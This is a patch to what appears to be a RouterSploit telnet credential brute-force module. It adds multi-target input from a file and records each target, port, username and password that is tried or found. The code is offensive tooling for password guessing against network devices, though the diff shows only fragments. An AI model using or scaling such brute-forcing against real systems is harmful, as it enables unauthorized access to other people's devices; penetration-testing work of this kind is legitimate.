@@ -10,6 +10,7 @@ from routersploit import (
     print_success,
     print_table,
     boolify,
+    multi,
 )
 
 
@@ -25,7 +26,7 @@ class Exploit(exploits.Exploit):
         ]
     }
 
-    target = exploits.Option('', 'Target IP address')
+    target = exploits.Option('', 'Target IP address or file with target:port (file://)')
     port = exploits.Option(23, 'Target port')
 
     threads = exploits.Option(8, 'Numbers of threads')
@@ -36,7 +37,10 @@ class Exploit(exploits.Exploit):
 
     def run(self):
         self.credentials = []
+        self.attack()
 
+    @multi
+    def attack(self):
         try:
             tn = telnetlib.Telnet(self.target, self.port)
             tn.expect(["login: ", "Login: "], 5)
@@ -55,7 +59,7 @@ class Exploit(exploits.Exploit):
 
         if len(self.credentials):
             print_success("Credentials found!")
-            headers = ("Login", "Password")
+            headers = ("Target", "Port", "Login", "Password")
             print_table(headers, *self.credentials)
         else:
             print_error("Credentials not found")
@@ -87,12 +91,12 @@ class Exploit(exploits.Exploit):
                         tn.close()
 
                         if i != -1:
-                            print_error(name, "Username: '{}' Password: '{}'".format(user, password), verbose=module_verbosity)
+                            print_error("Target: {}:{} {}: Authentication Failed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                         else:
                             if any(map(lambda x: x in res, ["#", "$", ">"])) or len(res) > 500:  # big banner e.g. mikrotik
                                 running.clear()
-                                print_success("{}: Authentication succeed!".format(name), user, password, verbose=module_verbosity)
-                                self.credentials.append((user, password))
+                                print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
+                                self.credentials.append((self.target, self.port, user, password))
                         tn.close()
                         break
                     except EOFError:
